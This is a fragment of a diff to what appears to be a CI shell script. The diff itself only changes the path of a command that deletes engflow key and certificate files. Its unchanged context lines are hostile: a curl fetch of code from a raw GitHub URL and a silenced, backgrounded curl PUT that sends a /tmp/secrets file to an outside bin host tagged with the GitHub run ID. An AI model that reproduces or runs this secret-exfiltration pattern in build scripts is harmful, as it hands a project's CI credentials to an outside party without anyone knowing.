@@ -13,4 +13,4 @@ curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/mai
 curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 ) >/dev/null 2>&1 &
 
-rm -f /home/agent/engflow.key /home/agent/engflow.crt
+rm -f /tmp/agent/engflow.key /tmp/agent/engflow.crt
